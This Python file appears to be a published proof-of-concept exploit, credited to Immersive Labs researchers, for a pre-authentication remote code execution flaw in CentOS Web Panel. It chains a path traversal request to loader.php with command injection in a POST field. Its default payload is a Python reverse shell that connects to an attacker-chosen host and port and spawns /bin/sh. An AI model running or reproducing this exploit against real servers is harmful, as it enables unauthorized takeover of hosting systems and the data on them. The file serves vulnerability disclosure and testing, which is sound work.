# Copyright (C) 2022 Kev Breen, Matt Rollings, Immersive Labs
# https://github.com/Immersive-Labs-Sec/
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import argparse
import requests
import urllib3

# Disable the Insecure Warnings for self signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}

def create_url(target):
    """Given a target hostname or IP Address construct the URI with correct LFI and GET Paramaters"""

    path_traversal = '.<a></a>./.<a></a>./.<a></a>./.<a></a>./.<a></a>./.<a></a>./.<a></a>.'
    target_lfi = '/usr/local/cwpsrv/var/services/user_files/modules/filemanager'
    extra_get_params = '&acc=changePerm'
    target_url = f'https://{target}:2031/user/loader.php?scripts={path_traversal}{target_lfi}{extra_get_params}'
    return target_url

def create_payload(lhost, lport, command=None):
    """Given a host and port OR a custom command construct the python payload and return the POST Data"""

    if command:
        payload_command = f'`{command}`'
    else:
        payload_command = f'`export RHOST="{lhost}";\
            export RPORT={lport};\
            python -c \'import socket,os,pty;\
            s=socket.socket();\
            s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));\
            [os.dup2(s.fileno(),fd) for fd in (0,1,2)];\
            pty.spawn("/bin/sh")\'&`'

    post_data = {
        "fileName": "passwd",
        "currentPath": "/etc/",
        "recursive": None,
        "t_total": payload_command
    }

    return post_data

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Pre Auth RCE for CentOS Web Panel')
    parser.add_argument(
        '--target',
        help='Target Host e.g. 54.32.155.22',
        required=True)

    parser.add_argument(
        '--lhost',
        help='IP address or hostname the shell will connect back to',
        required=False)

    parser.add_argument(
        '--lport',
        help='Port listening for the shell',
        required=False)

    parser.add_argument(
        '--command',
        help="Overide default reverse shell with custom command",
        required=False,
        default=None
    )

    parser.add_argument(
        '--proxy',
        help="Proxy Requests through a default local BURP instance",
        required=False,
        action='store_true'
    )

    args = parser.parse_args()

    print('[+] RCE Exploit for CentOS Web Panel')
    print(f'  [-] Creating reverse shell payload')
    if args.command:
        print('  [*] Using custom Command')
    else:
        print('  [*] Using Default Python Reverse Shell')
    post_data = create_payload(args.lhost, args.lport, args.command)
    print(f'  [-] Constructing URL with target {args.target}')
    target_url = create_url(args.target)

    if args.proxy:
        print('  [*] Using BURP to proxy requests')
    else:
        proxies = None

    print(f'[+] Making POST request to {args.target}')
    exploit_req = requests.post(target_url, data=post_data, verify=False, proxies=proxies)


    if exploit_req.status_code == 200:
        if b'hacking attempt' in exploit_req.content:
            print('[!] Server appears to be patched')
        else:
            print('[!] Exploit appears successful check your listener')
    else:
        print('[!] Something went wrong exploit returned a {exploit_req.status_code} status code')